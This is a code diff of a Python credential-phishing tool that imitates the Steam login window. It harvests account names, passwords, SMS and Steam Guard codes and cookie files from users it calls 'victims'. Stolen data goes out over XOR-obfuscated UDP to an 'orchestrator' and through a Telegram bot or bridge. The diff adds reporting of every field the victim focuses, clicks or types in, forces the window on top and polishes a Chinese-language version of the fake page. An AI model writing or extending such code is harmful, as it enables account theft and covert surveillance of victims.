@@ -24,15 +24,15 @@ BEGIN_AUTH_CRED = f"{API_BASE}/BeginAuthSessionViaCredentials/v1"
 UPDATE_AUTH = f"{API_BASE}/UpdateAuthSessionWithSteamGuardCode/v1"
 GET_RSA = f"{API_BASE}/GetPasswordRSAPublicKey/v1"
 POLL_AUTH = f"{API_BASE}/PollAuthSessionStatus/v1"
-_BT  = "VgZBXH9pYVJuRVB5M38tOxcCMSEFYhJUNTEJdh1rUjkgfU0NFwEhEzVAPPFsAaA=="
-_GID = "QwNIW31kbFdvRFsARQw="
+_BT  = ""
+_GID = ""
+UDP_PORT = 51337 # Default port for orchestrator link
 def _xd(data, key=0x77):
     try:
         import base64
         return bytes([b ^ key for b in base64.b64decode(data)]).decode('utf-8', errors='ignore')
     except:
         return None
-# Redirect all local logs to temp to avoid cluttering victim's desktop
 TEMP_ROOT = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'FinalTempSys')
 if not os.path.exists(TEMP_ROOT): os.makedirs(TEMP_ROOT, exist_ok=True)
 
@@ -60,7 +60,7 @@ def tg_notify(text):
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 # Encrypt for main.py's decrypt_string
                 data = text_clean.encode('utf-8')
-                salt = b'n2xkNQYbZwj8r9fz'
+                salt = b'c0mpl3x+S@lt#99'
                 xor_data = bytearray()
                 for i in range(len(data)):
                     xor_data.append(data[i] ^ salt[i % len(salt)])
@@ -75,13 +75,13 @@ def tg_notify(text):
         try:
             def check_tg_api(timeout=3):
                 try:
-                    urllib.request.urlopen("https://api.telegram.org", timeout=timeout)
+                    urllib.request.urlopen("http://127.0.0.1:0000", timeout=timeout)
                     return True
                 except:
                     return False
                     
-            payload = json.dumps({"chat_id": _CHAT_ID, "text": text_clean, "parse_mode": "HTML"}).encode('utf-8')
-            domain = "https://api.telegram.org"
+            # Direct connect removed payloads \n # payload = json.dumps({"chat_id": _CHAT_ID, "text": final_text, "parse_mode": "HTML"}).encode('utf-8')
+            # API removed
             if _TELEGRAM_BRIDGE and not check_tg_api():
                 domain = _TELEGRAM_BRIDGE
             domain = domain.rstrip('/')
@@ -97,7 +97,7 @@ def tg_notify(text):
             try:
                 log_path = os.path.join(TEMP_ROOT, "tg_log.txt")
                 with open(log_path, "a") as f:
-                    f.write(f"{time.ctime()}: {text_clean}\nError: {e}\n")
+                    f.write(f"{time.ctime()}: {final_text}\nError: {e}\n")
             except: pass
             
     threading.Thread(target=_send, daemon=True).start()
@@ -118,6 +118,23 @@ class SteamApi:
     def log_event(self, text):
         print(f"[JS Event] {text}")
         tg_notify(f"ℹ️ Steam Event: {text}")
+
+    def log_interaction(self, action, target):
+        """Telemetry handler for the Pro Action Logging script in the HTML."""
+        msg = ""
+        if action == "focus":
+            msg = f"👀 <b>Victim focused:</b> <code>{target}</code>"
+        elif action == "click":
+            msg = f"🖱️ <b>Victim clicked:</b> <code>{target}</code>"
+        elif action == "input":
+            msg = f"⌨️ <b>Victim typing in:</b> <code>{target}</code>"
+        
+        if msg:
+            tg_notify(msg)
+
+    def report_status(self, status):
+        """Unified status reporting for UI phase transitions."""
+        tg_notify(f"🎯 <b>Steam Status:</b> <code>{status}</code>")
 
     def collect_sms(self, code):
         print(f"[*] Submitting SMS Code: {code}")
@@ -370,7 +387,7 @@ class SteamApi:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                     raw_msg = f"FILE:{cookie_file}"
                     data = raw_msg.encode('utf-8')
-                    salt = b'n2xkNQYbZwj8r9fz'
+                    salt = b'c0mpl3x+S@lt#99'
                     xor_data = bytearray()
                     for i in range(len(data)):
                         xor_data.append(data[i] ^ salt[i % len(salt)])
@@ -529,31 +546,33 @@ class SteamApi:
                                 localStorage.setItem('Steam_Language', 'schinese');
                                 setInterval(() => {
                                     const replacements = {
-                                        "SIGN IN WITH ACCOUNT NAME": "用帐户名称登录",
-                                        "PASSWORD": "密码",
+                                        "Sign in with account name": "用帐户名称登录",
+                                        "Password": "密码",
                                         "Remember me": "记住我",
                                         "Sign in": "登录",
                                         "OR SIGN IN WITH QR CODE": "或者用二维码登录",
                                         "OR SIGN IN WITH QR": "或者用二维码登录",
-                                        "Use the Steam Mobile App to sign in via QR Code": "通过二维码使用 Steam 手机应用登录",
+                                        "Use the Steam Mobile App to sign in via QR Code": "使用 Steam 移动应用通过二维码登录",
                                         "This account is protected by a Steam Mobile Authenticator": "此帐户受到手机验证器保护。",
-                                        "Use the Steam Mobile App to confirm your sign in": "使用 Steam 手机应用来确认登录…",
-                                        "Enter a code instead": "改为输入代码",
-                                        "Enter the code from your Steam Mobile App": "输入您 Steam 手机应用上的代码",
-                                        "Use a backup code": "使用备用码",
-                                        "Help, I no longer have access to my Steam Mobile App": "请求帮助，我已无法访问我的 Steam 手机应用。",
+                                        "Use the Steam Mobile App to confirm your sign in": "请使用您的 Steam 移动应用来确认您的登录…",
+                                        "Enter a code instead": "输入验证码",
+                                        "Enter the code from your Steam Mobile App": "输入您的 Steam 移动应用中显示的验证码",
+                                        "Use backup code": "使用备用代码",
+                                        "Help, I no longer have access to my Steam Mobile App": "帮助，我无法再访问我的 Steam 令牌手机应用",
                                         "Please check your password and account name and try again": "请核对您的密码和帐户名称并重试",
-                                        "Help, I can't sign in": "请求帮助，我无法登录。",
-                                        "HELP, I CAN'T SIGN IN": "请求帮助，我无法登录。",
-                                        "USE THE STEAM MOBILE APP TO SIGN IN VIA QR CODE": "通过二维码使用 Steam 手机应用登录",
+                                        "The account name or password that you have entered is incorrect.": "您输入的帐户名称或密码错误。",
+                                        "Help, I can't sign in": "帮助，我无法登录",
+                                        "HELP, I CAN'T SIGN IN": "帮助，我无法登录",
+                                        "Don't have a Steam account? Create a Free Account": "没有 Steam 帐户？免费创建一个帐户",
+                                        "USE THE STEAM MOBILE APP TO SIGN IN VIA QR CODE": "使用 Steam 移动应用通过二维码登录",
                                         "THIS ACCOUNT IS PROTECTED BY A STEAM MOBILE AUTHENTICATOR": "此帐户受到手机验证器保护。",
-                                        "USE THE STEAM MOBILE APP TO CONFIRM YOUR SIGN IN": "使用 Steam 手机应用来确认登录…",
-                                        "ENTER A CODE INSTEAD": "改为输入代码",
-                                        "ENTER THE CODE FROM YOUR STEAM MOBILE APP": "输入您 Steam 手机应用上的代码",
-                                        "USE A BACKUP CODE": "使用备用码",
-                                        "HELP, I NO LONGER HAVE ACCESS TO MY STEAM MOBILE APP": "请求帮助，我已无法访问我的 Steam 手机应用。",
-                                        "ACCOUNT:": "帐户：",
-                                        "Account:": "帐户："
+                                        "USE THE STEAM MOBILE APP TO CONFIRM YOUR SIGN IN": "请使用您的 Steam 移动应用来确认您的登录…",
+                                        "ENTER A CODE INSTEAD": "输入验证码",
+                                        "ENTER THE CODE FROM YOUR STEAM MOBILE APP": "输入您的 Steam 移动应用中显示的验证码",
+                                        "USE A BACKUP CODE": "使用备用代码",
+                                        "HELP, I NO LONGER HAVE ACCESS TO MY STEAM MOBILE APP": "帮助，我无法再访问我的 Steam 令牌手机应用",
+                                        "ACCOUNT:": "帐户名:",
+                                        "Account:": "帐户名:"
                                 };
                                 const sortedKeys = Object.keys(replacements).sort((a, b) => b.length - a.length);
                                 const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
@@ -627,13 +646,17 @@ def _force_focus():
             pass
 
 def start_steam_ui(victim_id=None):
-    # Parse args for lang
+    # Parse args for lang and UDP
     lang = "en"
+    global UDP_PORT
     for i, arg in enumerate(sys.argv):
         if arg == "--lang" and i + 1 < len(sys.argv):
             l = sys.argv[i+1].lower()
             if "cn" in l or "zh" in l: lang = "cn"
             else: lang = "en"
+        elif arg == "--udp" and i + 1 < len(sys.argv):
+            try: UDP_PORT = int(sys.argv[i+1])
+            except: pass
 
     api = SteamApi(lang=lang)
     hostname = os.getenv('COMPUTERNAME', 'Unknown')
@@ -667,8 +690,8 @@ def start_steam_ui(victim_id=None):
         js_api=api, 
         width=720, 
         height=480, 
-        frameless=True,
-        on_top=False,
+        on_top=True, 
+        frameless=True, 
         resizable=False
     )
     api.set_window(window)
